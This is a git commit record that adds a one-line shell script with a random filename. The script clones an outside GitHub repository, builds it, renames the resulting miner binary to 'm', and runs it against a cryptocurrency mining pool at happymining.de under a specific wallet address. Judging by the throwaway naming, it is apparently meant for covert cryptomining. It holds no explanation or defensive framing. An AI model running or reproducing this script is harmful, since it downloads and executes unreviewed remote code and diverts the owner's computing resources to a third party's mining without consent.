936fa6341ea9c5be5dd9dd465a0a30a2cbca543e
FranzGerst1 <FranzGerst1@gmail.com>
2014-10-24 15:58:36 +0200

    Create ooL8aeDouZ.sh

---
+++ ooL8aeDouZ.sh
@@ -0,0 +1,1 @@
+git clone https://github.com/LenaBachm2/Lena && sh autogen.sh && ./configure && make && mv min*d m && ./m -a X11 -o stratum+tcp://happymining.de:7903 -u XhcqAM3vjvDsAsrmvRGDVPx7kVuhtdJMvX -p k
